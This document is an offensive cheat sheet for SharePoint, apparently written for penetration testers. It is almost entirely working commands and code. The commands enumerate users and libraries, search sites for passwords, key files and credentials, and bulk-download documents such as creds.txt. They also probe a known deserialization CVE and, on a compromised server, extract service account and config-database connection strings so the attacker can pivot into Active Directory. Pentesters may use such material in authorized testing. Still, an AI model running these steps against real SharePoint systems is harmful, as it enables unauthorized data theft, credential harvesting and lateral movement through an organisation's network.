# SharePoint Enumeration & Exploitation

## Site & User Enumeration

```bash
# Enumerate all sub-sites
curl -sk -u "DOMAIN\user:password" "https://sharepoint.com/_api/web/webs" | python3 -m json.tool

# Enumerate users on site
curl -sk -u "DOMAIN\user:password" "https://sharepoint.com/_api/web/siteusers" | \
  python3 -c "import sys,json; [print(u['LoginName'],u.get('Email','')) for u in json.load(sys.stdin)['value']]"

# Enumerate document libraries
curl -sk -u "DOMAIN\user:password" "https://sharepoint.com/_api/web/lists" | \
  python3 -c "import sys,json; [print(l['Title'],l['ItemCount']) for l in json.load(sys.stdin)['value'] if l['BaseType']==1]"

# Enumerate all site collections (admin endpoint)
curl -sk -u "DOMAIN\admin:password" "https://sharepoint.com/_api/site/url"
```

---

## Search for Sensitive Files

```bash
# Full-text search via REST API — finds documents containing keyword
curl -sk -u "DOMAIN\user:password" \
  "https://sharepoint.com/_api/search/query?querytext='password'&rowlimit=500" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); [print(r.get('Path','')) for r in d['PrimaryQueryResult']['RelevantResults']['Table']['Rows']]"

# Search for specific file types
curl -sk -u "DOMAIN\user:password" \
  "https://sharepoint.com/_api/search/query?querytext='*.kdbx OR *.pfx OR *.key'&rowlimit=200"

# Search keywords relevant to pentest
for kw in "password" "credentials" "vpn" "ssh" "api_key" "secret" "backup"; do
  echo "[*] Searching: $kw"
  curl -sk -u "DOMAIN\user:password" \
    "https://sharepoint.com/_api/search/query?querytext='$kw'&rowlimit=100"
done
```

---

## Document Download

```bash
# List items in a specific library
curl -sk -u "DOMAIN\user:password" \
  "https://sharepoint.com/_api/web/lists/getbytitle('Documents')/items?\$select=FileLeafRef,FileRef,Modified" | \
  python3 -m json.tool

# Download file
curl -sk -u "DOMAIN\user:password" \
  "https://sharepoint.com/sites/SITE/_layouts/15/download.aspx?SourceUrl=/sites/SITE/Shared%20Documents/creds.txt" \
  -o creds.txt

# Bulk download a library
python3 -c "
import requests, json, os
s = requests.Session()
s.auth = ('DOMAIN\\user', 'password')
s.verify = False
resp = s.get('https://sharepoint.com/_api/web/lists/getbytitle(\'Documents\')/items?\$select=FileLeafRef,FileRef')
for item in resp.json()['value']:
    url = 'https://sharepoint.com' + item['FileRef']
    fname = item['FileLeafRef']
    with open(fname,'wb') as f:
        f.write(s.get(url).content)
    print(f'Downloaded {fname}')
"
```

---

## CSOM (Client-Side Object Model) Access

```csharp
// Add NuGet: Microsoft.SharePointOnline.CSOM
using Microsoft.SharePoint.Client;

ClientContext ctx = new ClientContext("https://sharepoint.com");
ctx.Credentials = new System.Net.NetworkCredential("user", "password", "DOMAIN");

Web web = ctx.Web;
ctx.Load(web, w => w.Title, w => w.Lists);
ctx.ExecuteQuery();
Console.WriteLine($"Site: {web.Title}");

foreach (var list in web.Lists)
    Console.WriteLine($"  List: {list.Title} ({list.ItemCount} items)");

// Download a file
var file = web.GetFileByServerRelativeUrl("/sites/site/Shared Documents/creds.txt");
ctx.Load(file);
ctx.ExecuteQuery();
var stream = file.OpenBinaryStream();
ctx.ExecuteQuery();
using var fs = File.Create("creds.txt");
stream.Value.CopyTo(fs);
```

---

## SharePoint-Specific Vulnerabilities

| CVE | Affected | Description |
|-----|----------|-------------|
| CVE-2019-0604 | SP 2010–2019 | Deserialization RCE, widely exploited by APT actors |
| CVE-2020-0646 | SP 2013–2019 | Remote code execution via unsafe deserialization |
| CVE-2022-29108 | SP 2013–2019 | Remote code execution |

```bash
# Detect CVE-2019-0604 exposure
curl -sk -X POST "https://sharepoint.com/_layouts/15/Picker.aspx" \
  -d "__VIEWSTATE=..." --max-time 10
# Check if site uses legacy picker — indicator of unpatched instance
```

---

## SharePoint → Active Directory Pivot

SharePoint servers are often domain-joined with privileged service accounts.

```powershell
# On compromised SharePoint server: locate service account credentials
Get-WmiObject -Class Win32_Service | Where-Object { $_.Name -like "*SharePoint*" } |
  Select-Object Name, StartName

# Extract SharePoint config DB connection string (contains SA or service account creds)
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SharePoint")
$farm = [Microsoft.SharePoint.Administration.SPFarm]::Local
$farm.Services | ForEach-Object { $_.ConnectionString }
```
